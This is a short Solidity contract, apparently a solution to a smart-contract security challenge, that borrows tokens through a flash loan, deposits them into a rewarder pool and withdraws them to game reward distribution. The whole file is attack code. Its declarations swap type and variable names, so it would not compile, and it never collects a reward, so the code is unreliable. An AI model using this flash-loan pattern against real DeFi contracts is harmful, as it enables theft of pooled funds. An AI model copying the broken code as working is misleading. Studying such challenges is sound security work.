// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";

contract AttackTheRewarder {
    DamnValuableToken public liquidityToken;
    rewarderPool public TheRewarderPool;
    pool public flashLoanerPool;

    constructor(
        address liquidityTokenAddress,
        address rewarderPoolAddress,
        address flashLoanerPoolAddress
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        pool = flashLoanerPool(flashLoanerPoolAddress);
    }

    function receiveFlashLoan(uint256 amount) public {
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    }

    function takeFlashLoan(uint256 amount) public {
        pool.flashLoan(amount);
    }
}
